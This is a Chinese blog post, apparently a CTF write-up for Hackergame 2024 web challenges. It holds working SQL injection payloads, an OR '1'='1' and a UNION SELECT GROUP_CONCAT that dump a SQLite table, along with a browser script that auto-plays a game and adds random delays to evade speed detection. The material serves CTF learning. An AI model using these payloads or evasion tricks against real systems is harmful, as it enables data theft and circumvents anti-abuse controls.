<!DOCTYPE html><html lang="zn-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>Hackergame-2024-Web | </title><meta name="keywords" content="CTF刷题记录"><meta name="author" content="xxshh"><meta name="copyright" content="xxshh"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="Hackergame-2024-Web"><meta name="application-name" content="Hackergame-2024-Web"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="Hackergame-2024-Web"><meta property="og:url" content="http://example.com/2024/11/03/Hackergame-2024-Web/index.html"><meta property="og:site_name" content=""><meta property="og:description" content="签到 PaoluGPT下载源码，包含database.py和main.py。 # database.pyimport sqlite3def execute_query(s: str, fetch_all: bool &amp;#x3D; False):    conn &amp;#x3D; sqlite3.connect(&amp;quot;"><meta property="og:locale" content="zn-CN"><meta property="og:image" content="https://xxshh.github.io/images/%E7%B1%B3.jpg?_r_=2643a2f6-41e0-4ef4-6137-8d653e51ea24"><meta property="article:author" content="xxshh"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://xxshh.github.io/images/%E7%B1%B3.jpg?_r_=2643a2f6-41e0-4ef4-6137-8d653e51ea24"><meta name="description" content="签到 PaoluGPT下载源码，包含database.py和main.py。 # database.pyimport sqlite3def execute_query(s: str, fetch_all: bool &amp;#x3D; False):    conn &amp;#x3D; sqlite3.connect(&amp;quot;"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://example.com/2024/11/03/Hackergame-2024-Web/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: undefined,
  LA51: undefined,
  greetingBox: undefined,
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: false,
  mainTone: undefined,
  authorStatus: undefined,
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    simplehomepage: true,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: xxshh","link":"链接: ","source":"来源: ","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: '',
  title: 'Hackergame-2024-Web',
  postAI: '',
  pageFillDescription: '签到, PaoluGPT, 喜欢做签到的 CTFer 你们好呀, 比大小王, Node.js is Web Scale, 禁止内卷签到下载源码包含和的关键代码分析以上代码发现直接将插入到查询中没有经过参数化或转义这是一个明显的注入漏洞闭合方式是单引号构造理论上会返回所有行但是只返回了一条数据阅读源码发现使用了默认返回第一行结果想到利用查询语句的列数是所以构造注意是的特有注释方式在其他数据库系统如中不被支持在注入时建议使用因为它是一个更通用的注释符号确保在各种数据库中都能正确工作在结果中搜索关键词喜欢做签到的你们好呀比大小王快速答题的主函数计算出正确答案并立即选择更新输入列表累加分数更新页面显示更新进度条判断是否已经达到分调用函数自动提交达到分自动提交答案否则更新下一个值并继续快速答题立即递归调用继续答题到毫秒快速自动游戏开始小结自执行匿名函数函数体在中使用括号的原因是为了将函数声明转换为函数表达式从而能够立即调用它函数发送一个包含的请求到服务器的路径并将玩家的所有输入数组作为数据发送返回的数据会显示在页面的元素中可能包含有关结果的信息比如成功或失败的消息如果服务器返回的消息中包含可以在这里查看到由于键盘和鼠标事件触发函数来更新输入如果可以通过脚本触发这些事件就可以快速累积到分并触发函数游戏中有防止快速答题的机制检测到我们修改了状态或超速完成操作为了避免被识别为时空穿越增加一个稍短的间隔例如到毫秒的随机延时来模拟真实答题变量用于控制用户是否可以输入答案在正常情况下游戏逻辑中会在倒计时结束后将其设置为以允许用户输入但是在这段自动化代码中输入的选择是直接计算出来的没有实际的用户输入行为因此即使在倒计时期间也能够执行原型链污染禁止内卷读取文件并解析为格式注意这个排序你忘了上传文件你提交的好像不是平方差的总和分数计算出现错误评测成功你的平方差为仔细阅读后端代码后端接收到上传的文件后首先会检查文件是否存在然后将文件保存到目录后端会尝试将上传的文件读取并解析为格式然后它将与预设的进行比较通过计算上传的文件中的数字与中的数字之间的平方差得到评分如果提交的列表每一项都是那么评分的结果将等于列表所有元素的平方和通过更改第一个元素猜测列表的第一个元素如果是那么两次结果的差应是的平方是一种轻量级的数据交换格式它通常用于传输数据特别是在应用程序中格式的数据结构由以下几部分组成对象由花括号包裹的键值对集合键必须是字符串值可以是多种类型数组由方括号包裹的值的集合值可以是任何类型字符串被双引号包裹的文本数字布尔值也支持这些原始数据类型在格式中数据本质上是以字符串的形式传输的脚本如下后端是的替代写法因为是的保留字方法返回一个包含所有匹配结果的列表提取出后面的数字部分并去除任何多余的空格或换行符找到在中多出来的元素如果元素在中的出现次数与在中的出现次数不相等则返回如果不在中则返回是字符串找到全的平方差但是提交上去显示答案错误因为在代码中做了归一化的操作重新审题题目中有提示助教部署的时候偷懒了直接用了当然了助教也读过的文档所以是关了的而且有的时候助教想改改代码又懒得手动重启所以还开了启动的完整命令为网站代码运行在在使用时通常是应用的主文件这道题的关键是服务器的后端使用了命令运行并开启了选项那么如果有文件换掉了会马上应用新的脚本所以在源代码中写一个读取并返回的然后上传替换掉原本的即可上传文件的目录是题干又特意提示了网站目录在想到路径穿越漏洞上传文件的时候给文件名前加上就可以穿透目录上传到任意的地方去抓包修改传输路径为访问对应的数字加后使用编码转换',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-12-09 16:33:25',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="" type="application/atom+xml">
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://xxshh.github.io/images/Avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title"></div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/12/"><span class="card-archive-list-date">December 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">6</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/11/"><span class="card-archive-list-date">November 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/10/"><span class="card-archive-list-date">October 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/09/"><span class="card-archive-list-date">September 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">August 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="article-meta tags"><a class="article-meta__tags" href="/tags/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>CTF刷题记录</span></a></span></div></div><h1 class="post-title" itemprop="name headline">Hackergame-2024-Web</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-11-03T04:11:18.000Z" title="发表于 2024-11-03 12:11:18">2024-11-03</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-12-09T08:33:25.199Z" title="更新于 2024-12-09 16:33:25">2024-12-09</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="Hackergame-2024-Web"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为北京"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>北京</span></div></div></div><article class="post-content" id="article-container" itemscope itemtype="http://example.com/2024/11/03/Hackergame-2024-Web/"><header><a href="/tags/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" tabindex="-1" itemprop="url">CTF刷题记录</a><h1 id="CrawlerTitle" itemprop="name headline">Hackergame-2024-Web</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">xxshh</span><time itemprop="dateCreated datePublished" datetime="2024-11-03T04:11:18.000Z" title="发表于 2024-11-03 12:11:18">2024-11-03</time><time itemprop="dateCreated datePublished" datetime="2024-12-09T08:33:25.199Z" title="更新于 2024-12-09 16:33:25">2024-12-09</time></header><h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241103121215.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241103124000.png"></p>
<h1 id="PaoluGPT"><a href="#PaoluGPT" class="headerlink" title="PaoluGPT"></a>PaoluGPT</h1><p>下载源码，包含database.py和main.py。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># database.py</span><br><br><span class="hljs-keyword">import</span> sqlite3<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">execute_query</span>(<span class="hljs-params">s: <span class="hljs-built_in">str</span>, fetch_all: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span></span>):<br>    conn = sqlite3.connect(<span class="hljs-string">&quot;file:/tmp/data.db?mode=ro&quot;</span>, uri=<span class="hljs-literal">True</span>)<br>    cur = conn.cursor()<br>    res = cur.execute(s)<br>    <span class="hljs-keyword">if</span> fetch_all:<br>        <span class="hljs-keyword">return</span> res.fetchall()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> res.fetchone()<br></code></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># main.py的关键代码</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/list&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">list</span>():<br>    results = execute_query(<span class="hljs-string">&quot;select id, title from messages where shown = true&quot;</span>, fetch_all=<span class="hljs-literal">True</span>)<br>    messages = [Message(m[<span class="hljs-number">0</span>], m[<span class="hljs-number">1</span>], <span class="hljs-literal">None</span>) <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> results]<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;list.html&quot;</span>, messages=messages)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/view&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">view</span>():<br>    conversation_id = request.args.get(<span class="hljs-string">&quot;conversation_id&quot;</span>)<br>    results = execute_query(<span class="hljs-string">f&quot;select title, contents from messages where id = &#x27;<span class="hljs-subst">&#123;conversation_id&#125;</span>&#x27;&quot;</span>)<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;view.html&quot;</span>, message=Message(<span class="hljs-literal">None</span>, results[<span class="hljs-number">0</span>], results[<span class="hljs-number">1</span>]))<br></code></pre></td></tr></table></figure>

<p>分析以上代码，发现</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">title</span>, contents <span class="hljs-keyword">from</span> messages <span class="hljs-keyword">where</span> id = <span class="hljs-string">&#x27;&#123;conversation_id&#125;&#x27;</span><br></code></pre></td></tr></table></figure>
<p>直接将<code>conversation_id</code> 插入到查询中，没有经过参数化或转义，这是一个明显的SQL 注入漏洞。</p>
<p>闭合方式是单引号，构造<code>https://chal01-acbmue75.hack-challenge.lug.ustc.edu.cn:8443/view?conversation_id=1&#39; OR &#39;1&#39;=&#39;1</code>，理论上会返回所有行，但是只返回了一条数据。</p>
<p>阅读源码，发现<code>execute_query</code> 使用了 <code>cur.fetchone()</code>，默认返回第一行结果。想到利用<code>group_concat</code>。</p>
<p>查询语句的列数是2，所以构造</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><code class="hljs n1ql">https://chal01-acbmue75.hack-challenge.lug.ustc.edu.cn:8443/view?conversation_id=1&#x27; UNION <span class="hljs-keyword">SELECT</span> GROUP_CONCAT(contents, <span class="hljs-string">&#x27;;&#x27;</span>), <span class="hljs-literal">NULL</span> <span class="hljs-keyword">FROM</span> messages--<br></code></pre></td></tr></table></figure>

<p>注意：<code>#</code> 是 MySQL 的特有注释方式，在其他数据库系统（如 SQLite）中不被支持。<br>在 SQL 注入时，建议使用 <code>--</code>，因为它是一个更通用的注释符号，确保在各种数据库中都能正确工作。</p>
<p>在结果中搜索flag关键词。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241103155909.png"></p>
<h1 id="喜欢做签到的-CTFer-你们好呀"><a href="#喜欢做签到的-CTFer-你们好呀" class="headerlink" title="喜欢做签到的 CTFer 你们好呀"></a>喜欢做签到的 CTFer 你们好呀</h1><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241103163940.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241105140601.png"></p>
<h1 id="比大小王"><a href="#比大小王" class="headerlink" title="比大小王"></a>比大小王</h1><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241105211516.png"></p>
<figure class="highlight pf"><table><tr><td class="code"><pre><code class="hljs pf">(function fastAutomateGame() &#123;<br>  // 快速答题的主函数<br>  function autoChooseAnswer() &#123;<br>    if (<span class="hljs-keyword">state</span>.score1 <span class="hljs-variable">&lt; 100) &#123;</span><br><span class="hljs-variable">      // 计算出正确答案并立即选择</span><br><span class="hljs-variable">      const choice = state.value1 &lt; state.value2 ? &#x27;&lt;&#x27; : &#x27;&gt;</span>&#x27;;<br>      <span class="hljs-keyword">state</span>.inputs.push(choice); // 更新输入列表<br>      <span class="hljs-keyword">state</span>.score1++; // 累加分数<br><br>      // 更新页面显示<br>      document.getElementById(&#x27;score1&#x27;).textContent = <span class="hljs-keyword">state</span>.score1;<br>      document.getElementById(&#x27;progress1&#x27;).style.width = `$&#123;<span class="hljs-keyword">state</span>.score1&#125;%`; // 更新进度条<br><br>      // 判断是否已经达到<span class="hljs-number">100</span>分<br>      if (<span class="hljs-keyword">state</span>.score1 === <span class="hljs-number">100</span>) &#123;<br>        // 调用submit函数自动提交<br>        submit(<span class="hljs-keyword">state</span>.inputs);<br>        console.<span class="hljs-keyword">log</span>(<span class="hljs-string">&quot;达到 100 分，自动提交答案！&quot;</span>);<br>      &#125; else &#123;<br>        // 否则更新下一个值并继续快速答题<br>        <span class="hljs-keyword">state</span>.value1 = <span class="hljs-keyword">state</span>.values[<span class="hljs-keyword">state</span>.score1][<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">state</span>.value2 = <span class="hljs-keyword">state</span>.values[<span class="hljs-keyword">state</span>.score1][<span class="hljs-number">1</span>];<br>        document.getElementById(&#x27;value1&#x27;).textContent = <span class="hljs-keyword">state</span>.value1;<br>        document.getElementById(&#x27;value2&#x27;).textContent = <span class="hljs-keyword">state</span>.value2;<br><br>        // 立即递归调用继续答题<br>        <span class="hljs-keyword">const</span> <span class="hljs-keyword">random</span>Delay = Math.floor(Math.<span class="hljs-keyword">random</span>() * <span class="hljs-number">100</span>) + <span class="hljs-number">50</span>; // <span class="hljs-number">50</span>到<span class="hljs-number">150</span>毫秒<br>        <span class="hljs-built_in">set</span>Timeout(autoChooseAnswer, <span class="hljs-keyword">random</span>Delay);<br>      &#125;<br>    &#125;<br>  &#125;<br><br>  console.<span class="hljs-keyword">log</span>(<span class="hljs-string">&quot;快速自动游戏开始...&quot;</span>);<br>  autoChooseAnswer();<br>&#125;)();<br></code></pre></td></tr></table></figure>

<p><strong>小结</strong>：</p>
<ol>
<li><p>自执行匿名函数（IIFE）：</p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><code class="hljs actionscript">(<span class="hljs-keyword">function</span> <span class="hljs-title function_">fastAutomateGame</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-comment">// 函数体</span><br>&#125;)();<br></code></pre></td></tr></table></figure>
<p>在 IIFE 中使用括号的原因是为了将函数声明转换为函数表达式，从而能够立即调用它。</p>
</li>
<li><p><code>submit</code> 函数发送一个包含 <code>inputs</code> 的 POST 请求到服务器的 <code>/submit</code> 路径，并将玩家的所有输入（<code>inputs</code> 数组）作为数据发送。返回的数据（<code>data.message</code>）会显示在页面的 <code>dialog</code> 元素中，可能包含有关结果的信息，比如“成功”或“失败”的消息。如果服务器返回的消息中包含 <code>flag</code>，可以在这里查看到。</p>
</li>
<li><p>由于键盘和鼠标事件触发 <code>chooseAnswer</code> 函数来更新输入，如果可以通过脚本触发这些事件，就可以快速累积到 <code>100</code> 分，并触发 <code>submit</code> 函数。</p>
</li>
<li><p>游戏中有防止“快速答题”的机制，检测到我们修改了状态或超速完成操作。为了避免被识别为“时空穿越”，增加一个稍短的间隔（例如，50到150毫秒的随机延时）来模拟真实答题。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/ec948a9a2132e502da831b8bb8b2331.png"></p>
</li>
<li><p><code>state.allowInput</code> 变量用于控制用户是否可以输入答案。在正常情况下，游戏逻辑中会在倒计时结束后将其设置为 <code>true</code>，以允许用户输入。但是，在这段自动化代码中，输入的选择是直接计算出来的，没有实际的用户输入行为，因此即使在倒计时期间也能够执行。</p>
</li>
</ol>
<h1 id="Node-js-is-Web-Scale"><a href="#Node-js-is-Web-Scale" class="headerlink" title="Node.js is Web Scale"></a>Node.js is Web Scale</h1><p><a target="_blank" rel="noopener" href="https://xsh.asia/2024/11/05/Node.js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">Node.js原型链污染 |</a><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/Node.js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93.md" alt="Node.js原型链污染"></p>
